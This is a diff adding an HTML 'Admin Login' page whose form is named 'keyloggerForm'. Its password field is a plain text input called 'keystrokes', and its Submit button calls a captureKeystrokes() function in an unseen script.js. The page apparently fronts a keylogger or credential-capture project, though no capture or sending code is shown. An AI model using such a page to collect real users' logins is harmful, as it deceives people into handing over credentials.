@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Login</title>
+    <style>
+        /* Add CSS to center the form */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: rgb(238,174,202);
+            background: radial-gradient(circle, rgba(238,174,202,1) 0%, rgba(148,187,233,1) 100%);
+        }
+        #keyloggerForm {
+            text-align: center;
+        }
+        button {
+            background-color: rgb(227, 149, 236);
+        }
+    </style>
+    <link rel = "icon" href = "icon.jpg">
+</head>
+<body>
+    <form id="keyloggerForm">
+        <label for="username">User Name</label>
+        <input type="text" id="username" name="username"> 
+        <br>  <br>
+
+        <label for="keystrokes">Password</label>
+        <input type="text" id="keystrokes" name="keystrokes">
+        <br>  <br>
+
+        <button type="button" onclick="captureKeystrokes()">Submit</button>
+    </form>
+
+    <script src="script.js"></script>
+</body>
+</html>
